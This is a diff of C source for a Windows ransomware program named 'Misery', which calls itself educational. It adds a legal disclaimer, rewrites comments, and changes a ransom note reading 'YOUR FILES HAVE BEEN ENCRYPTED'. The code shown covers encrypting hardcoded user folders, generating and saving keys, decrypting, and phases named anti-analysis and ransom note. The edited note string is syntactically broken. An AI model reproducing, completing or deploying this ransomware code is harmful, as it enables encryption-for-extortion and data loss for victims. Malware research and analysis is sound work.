@@ -1,3 +1,29 @@
+/*Author: Jahanzaib Ashraf Mir
+Kashmir
+CSE GRAD W/S in Cybersecurity
+Malware Researcher | Cybersecurity Engineer | Hacker
+Copyright © 2026. All Rights Reserved.
+
+This educational script and software is designed
+strictly for academic research and defensive analysis.
+No part of this script may be reproduced, published, distributed, modified,
+sold, rebranded, or executed on any unauthorized systems, networks, or servers,
+by any means or in any form, without prior written permission of the copyright owner.
+
+Unauthorized use, deployment, or duplication is strictly prohibited and may result
+in severe legal action under applicable copyright and computer crime statutes.
+
+THIS SOFTWARE IS PROVIDED "AS IS" FOR EDUCATIONAL PURPOSES ONLY.
+The author assumes zero liability and no responsibility for any misuse, damage,
+data loss, or illegal activity resulting from the execution of this code.
+Execution against non-consenting target systems is strictly illegal.*/
+
+/*God help whoever touches this piece of code next.
+It took me thousands of compilation errors 
+and countless nights and 600mg of caffiene every single day
+and i still dont know how did this even work*/
+
+
 #include "misery_config.h"
 #include "crypto.h"
 #include "fileops.h"
@@ -19,8 +45,14 @@
 #define MAX_TARGETS 100
 #define ENCRYPTION_TIMEOUT_MS 300000
 
+/* The function of this piece of code
+   is not set dynamic for educational purposes.
+   This is set from the path of device on which Misery was developed on
+   But however, users can still change it, or modify it by their means ;)
+   */
+
 /* Target directories for encryption/decryption.
-   IMPORTANT: misery.key is saved OUTSIDE these directories. */
+   IMPORTANT, misery.key is saved OUTSIDE these directories. */
 const char *g_target_dirs[] = {
     "C:\\Users\\jahan\\OneDrive\\Desktop",
     "C:\\Users\\jahan\\Documents",
@@ -46,25 +78,25 @@ static void GenerateRawKey(BYTE *key, DWORD keySize) {
 
 /*
  Save key file in clean hex format to a location OUTSIDE all
- * target directories.
- *
- * Format:
- *   <32 hex chars for salt>
- *   <64 hex chars for key>
- *
- * FIX v3.2: Do NOT overwrite an existing misery.key.
- * If a key file already exists (from a previous encryption run),
- * save the new one as "misery.key.new" to preserve the old key.
- * This prevents the decryptor from losing the ability to decrypt
- * files encrypted by the older run.
- * */
+ target directories.
+ 
+  Format:
+    <32 hex chars for salt>
+    <64 hex chars for key>
+
+  This does  NOT overwrite an existing misery.key.
+  If a key file already exists (from a previous encryption run),
+  save the new one as "misery.key.new" to preserve the old key.
+  This prevents the decryptor from losing the ability to decrypt
+  files encrypted by the older run.
+  */
 static bool SaveKeyFile(const BYTE *rawKey, DWORD keyLen, const BYTE *salt) {
     int savedCount = 0;
     char saltHex[33], keyHex[65];
     bytes_to_hex(salt, SALT_SIZE, saltHex);
     bytes_to_hex(rawKey, keyLen, keyHex);
 
-    /* Helper: write key content to a given path */
+    /*  write key content to a given path */
     #define WRITE_KEY_FILE(path, label) do {                                   \
         FILE *kf = fopen(path, "r");                                          \
         bool exists = (kf != NULL);                                            \
@@ -87,7 +119,7 @@ static bool SaveKeyFile(const BYTE *rawKey, DWORD keyLen, const BYTE *salt) {
         }                                                                      \
     } while(0)
 
-    /* Location 1: %TEMP% – guaranteed outside all target dirs */
+    /* Location first, %TEMP% */
     char tempPath[MAX_PATH];
     if (GetTempPathA(MAX_PATH, tempPath)) {
         char keyPath[MAX_PATH * 2];
@@ -95,7 +127,7 @@ static bool SaveKeyFile(const BYTE *rawKey, DWORD keyLen, const BYTE *salt) {
         WRITE_KEY_FILE(keyPath, "TEMP");
     }
 
-    /* Location 2: Desktop (user-visible, but we skip it in fileops) */
+    /* Location 2,  Desktop/  */
     char desktop[MAX_PATH];
     if (SHGetFolderPathA(NULL, CSIDL_DESKTOP, NULL, 0, desktop) == S_OK) {
         char keyPath[MAX_PATH * 2];
@@ -103,7 +135,7 @@ static bool SaveKeyFile(const BYTE *rawKey, DWORD keyLen, const BYTE *salt) {
         WRITE_KEY_FILE(keyPath, "Desktop");
     }
 
-    /* Location 3: CWD – with IsKeyFilePath exclusion in fileops */
+    /* Location 3: CWD*/
     char cwd[MAX_PATH];
     if (GetCurrentDirectoryA(MAX_PATH, cwd)) {
         /* Skip if CWD is same as Desktop or TEMP (avoid duplicate) */
@@ -127,10 +159,7 @@ static bool SaveKeyFile(const BYTE *rawKey, DWORD keyLen, const BYTE *salt) {
     return savedCount > 0;
 }
 
-/* ===================================================================
- * Open misery.key from any known location.
- * Returns handle opened in text mode ("r") for hex parsing.
- * =================================================================== */
+
 static FILE *OpenKeyFile(char *outPath, size_t outPathSize) {
     char tempPath[MAX_PATH];
     if (GetTempPathA(MAX_PATH, tempPath)) {
@@ -153,21 +182,21 @@ static FILE *OpenKeyFile(char *outPath, size_t outPathSize) {
     return NULL;
 }
 
-/* ===================================================================
- * FIX v3.2: Recursive collector that finds ALL .encrypted files
- * and extracts each file's embedded 16-byte salt.
- *
- * Populates:
- *   outFiles[]  – UTF-8 paths of .encrypted files found
- *   outSalts[]  – 16-byte salt read from each file's header
- *   outCount    – number of files collected (capped at maxCount)
- *
- * Returns true if at least one file was found.
- * =================================================================== */
+/* 
+  Recursive collector that finds ALL .encrypted files
+  and extracts each file's embedded 16-byte salt.
+ 
+  Populates:
+    outFiles[]  – UTF-8 paths of .encrypted files found
+    outSalts[]  – 16-byte salt read from each file's header
+    outCount    – number of files collected (capped at maxCount)
+ 
+  Returns true if at least one file was found.
+ */
 static bool CollectEncryptedFilesRecursive(const WCHAR *root,
                                            char **outFiles, BYTE (*outSalts)[SALT_SIZE],
                                            int *outCount, int maxCount) {
-    if (*outCount >= maxCount) return true; /* already full */
+    if (*outCount >= maxCount) return true; // already full
 
     WCHAR searchPath[FILEOPS_MAX_PATH];
     _snwprintf(searchPath, FILEOPS_MAX_PATH - 1, L"%s\\*", root);
@@ -224,17 +253,17 @@ static bool CollectEncryptedFilesRecursive(const WCHAR *root,
     return anyFound;
 }
 
-/* ===================================================================
- * FIX v3.2: Find an .encrypted file whose embedded salt MATCHES
- * the provided keySalt.
- *
- * When the user runs encryption multiple times, each run generates
- * a new salt and overwrites misery.key. But old .encrypted files
- * (from previous runs) retain their original salt. The decryptor
- * must find a file whose salt matches the CURRENT key's salt.
- *
- * Returns true and fills outPath/outSalt on match.
- * =================================================================== */
+/* 
+  Find an .encrypted file whose embedded salt MATCHES
+  the provided keySalt.
+ 
+  When the user runs encryption multiple times, each run generates
+  a new salt and overwrites misery.key. But old .encrypted files
+  (from previous runs) retain their original salt. The decryptor
+  must find a file whose salt matches the CURRENT key's salt.
+ 
+  Returns true and fills outPath/outSalt on match.
+*/
 static bool FindEncryptedFileWithMatchingSalt(const BYTE *keySalt,
                                               BYTE *outSalt, char *outPath,
                                               size_t outPathSize) {
@@ -289,10 +318,10 @@ static bool FindEncryptedFileWithMatchingSalt(const BYTE *keySalt,
     return found;
 }
 
-/* ===================================================================
- * Legacy: Find first .encrypted file (used as fallback when
- * the caller provides the salt directly, e.g. CLI -d mode).
- * =================================================================== */
+/*
+ * Find first .encrypted file
+
+*/
 static bool FindFirstEncryptedFileAndSalt(BYTE *outSalt, char *outPath,
                                            size_t outPathSize) {
     for (int i = 0; g_target_dirs[i]; i++) {
@@ -315,25 +344,7 @@ static bool FindFirstEncryptedFileAndSalt(BYTE *outSalt, char *outPath,
     return false;
 }
 
-/* ===================================================================
- * FIX v3.2: Fully rewritten decryption engine.
- *
- * Flow (GUI mode – keyHex only, no salt):
- *   1. Parse hex key string to 32 raw bytes
- *   2. Derive a temporary key+salt to compute the "key salt"
- *      (the salt that would be embedded in files encrypted by this key)
- *   3. Search ALL .encrypted files for one whose salt matches
- *   4. Test-decrypt that matching file – if HMAC fails, key is WRONG
- *   5. Run full FileOps decrypt on all target directories
- *
- * Why this fix is needed:
- *   Multiple encryption runs each generate a new random salt.
- *   Old .encrypted files retain their original salt. The old code
- *   picked the FIRST .encrypted file found and used its salt for
- *   test-decrypt. If that file was from an older run, the salt
- *   wouldn't match → false "key incorrect" error.
- *   Now we scan all files and pick one with a MATCHING salt.
- * =================================================================== */
+
 bool MiseryRunDecrypt(const char *keyHex, FILEOPS_STATS *outStats) {
     if (!keyHex || !*keyHex) {
         MiseryLog(MISERY_LOG_ERROR, "Decrypt: No key provided");
@@ -363,29 +374,27 @@ bool MiseryRunDecrypt(const char *keyHex, FILEOPS_STATS *outStats) {
         return false;
     }
 
-    /* =================================================================
-     * FIX v3.2: Derive the "key salt" from the raw key.
-     *
-     * When encrypting, InitCryptoRaw(rawKey, ..., NULL) generates a
-     * random salt internally. The same raw key + the SAME salt always
-     * produces the same derived AES key and HMAC key.
-     *
-     * The salt embedded in .encrypted files is whatever salt was
-     * generated during that specific encryption run. So to find which
-     * files belong to this key, we need to know what salt was used.
-     *
-     * Since we only have the raw key (from GUI paste), we init crypto
-     * with a NULL salt → it generates a NEW random salt. That won't
-     * match anything.
-     *
-     * SOLUTION: Instead of trying to derive the salt from the key
-     * (impossible – it's random), we collect ALL .encrypted files,
-     * read each file's salt, init crypto with rawKey + that salt,
-     * and test-decrypt. The file that passes HMAC is the match.
-     * =================================================================
-     *
-     * OPTIMIZED APPROACH: Collect all unique salts from .encrypted
-     * files, try each one until HMAC verification passes.
+    /* Derive the "key salt" from the raw key.
+     
+      When encrypting, InitCryptoRaw(rawKey, ..., NULL) generates a
+      random salt internally. The same raw key + the SAME salt always
+      produces the same derived AES key and HMAC key.
+     
+      The salt embedded in .encrypted files is whatever salt was
+      generated during that specific encryption run. So to find which
+      files belong to this key, we need to know what salt was used.
+     
+      Since we only have the raw key (from GUI paste), we init crypto
+      with a NULL salt → it generates a NEW random salt. That won't
+      match anything.
+     
+      SOLUTION is Instead of trying to derive the salt from the key
+      we collect ALL .encrypted files,
+     read each file's salt, init crypto with rawKey + that salt,
+      and test-decrypt. The file that passes HMAC is the match.
+   
+     *approaach could be  Collect all unique salts from .encrypted
+     files, try each one until HMAC verification passes.
      */
     #define MAX_SALT_CANDIDATES 64
 
@@ -419,11 +428,11 @@ bool MiseryRunDecrypt(const char *keyHex, FILEOPS_STATS *outStats) {
               totalCount);
 
     /*
-     * Try each file's salt until we find one where HMAC verification
-     * passes. This is the CORRECT approach because:
-     *   - Each encryption run uses a unique random salt
-     *   - The same raw key with different salts produces different AES/HMAC keys
-     *   - Only the correct (key, salt) pair will pass HMAC
+      Try each file's salt until we find one where HMAC verification
+      passes. This is the CORRECT approach because:
+        - Each encryption run uses a unique random salt
+        - The same raw key with different salts produces different AES/HMAC keys
+        - Only the correct (key, salt) pair will pass HMAC
      */
     int    matchedIdx   = -1;
     BYTE   matchedSalt[SALT_SIZE] = {0};
@@ -563,9 +572,8 @@ bool MiseryRunDecrypt(const char *keyHex, FILEOPS_STATS *outStats) {
     return true;
 }
 
-/* ===================================================================
- * PHASE EXECUTIONS (unchanged from original, using Updated crypto)
- * =================================================================== */
+
+ // PHASE EXECUTIONS 
 
 static bool ExecutePhaseAntiAnalysis(void) {
     MiseryLog(MISERY_LOG_INFO, "Starting ANTI-ANALYSIS phase...");
@@ -672,12 +680,11 @@ static bool ExecutePhaseRansomNote(void) {
 
     /* Drop text note on desktop */
     const char *note_content =
-        "========================================\n"
+        "\n"
         "YOUR FILES HAVE BEEN ENCRYPTED\n"
-        "========================================\n"
-        "This is a research project demonstration.\n"
-        "For authorized penetration tests only.\n"
-        "========================================\n";
+        "\n"
+        \n"
+        \n";
 
     char desktop_path[MAX_PATH];
     if (SHGetFolderPathA(NULL, CSIDL_DESKTOP, NULL, 0, desktop_path) == S_OK) {
@@ -698,9 +705,9 @@ static bool ExecutePhaseCleanup(void) {
     return MiseryPhaseTransition(PHASE_CLEANUP, true);
 }
 
-/* ===================================================================
- * MAIN
- * =================================================================== */
+
+ // this is MAIN
+ 
 int main(int argc, char **argv) {
     DWORD start_time = GetTickCount();
 
@@ -715,13 +722,7 @@ int main(int argc, char **argv) {
     bool decryptmode = (argc > 1 && strcmp(argv[1], "-d") == 0);
 
     if (decryptmode) {
-        /* ============================================================
-         * DECRYPT MODE – parse hex key file
-         *
-         * In CLI mode, the full misery.key (salt + key) is available,
-         * so we can directly init crypto with the correct salt and
-         * don't need the salt-scanning logic.
-         * ============================================================ */
+        
         MiseryLog(MISERY_LOG_INFO, "Mode: COMMAND-LINE DECRYPT");
 
         char keyfilePath[MAX_PATH * 2] = {0};
@@ -767,11 +768,6 @@ int main(int argc, char **argv) {
             return 1;
         }
 
-        /* CLI mode: init crypto with the known salt from key file,
-         * then fall through to MiseryRunDecrypt which will use the
-         * salt-scanning approach (it will match on the first try since
-         * we already have the correct salt, but the crypto context
-         * gets re-initialized inside MiseryRunDecrypt). */
         CleanupCrypto();
         CRYPTO_ERROR cerr = InitCryptoRaw(rawKey, RAW_KEY_SIZE, salt);
         SecureZeroMemory(rawKey, sizeof(rawKey));
@@ -796,9 +792,9 @@ int main(int argc, char **argv) {
         return 0;
     }
 
-    /* ================================================================
-     * ENCRYPT MODE
-     * ================================================================ */
+   
+     //ENCRYPT MODE
+   
     MiseryLog(MISERY_LOG_INFO, "Mode: ENCRYPT");
 
     /* Generate 32 cryptographically secure random bytes */
@@ -821,7 +817,7 @@ int main(int argc, char **argv) {
         return 1;
     }
 
-    /* Save key file (hex format) – FIX: won't overwrite existing */
+    /* Save key file  */
     if (!SaveKeyFile(rawKey, RAW_KEY_SIZE, GetCryptoCtx()->salt)) {
         MiseryLog(MISERY_LOG_ERROR, "CRITICAL: Failed to save key to ANY location!");
     } else {
